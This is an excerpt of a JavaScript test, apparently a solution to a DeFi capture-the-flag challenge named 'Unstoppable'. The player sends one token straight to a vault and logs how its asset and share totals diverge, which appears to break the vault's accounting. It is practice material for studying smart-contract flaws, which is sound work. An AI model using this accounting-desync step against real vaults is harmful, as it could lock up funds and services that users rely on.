...
describe('[Challenge] Unstoppable', function () {
    ...
    it('Execution', async function () {
        ...
        console.log("Vault's total underlying assets:", await vault.totalAssets());
        console.log("Vault's total Shares:", await vault.totalSupply());
        await token.connect(player).transfer(vault.address, 1);
        console.log("Vault's total underlying assets after trasnfer:", await vault.totalAssets());
        console.log("Vault's total Shares after transfer:", await vault.totalSupply());
    });
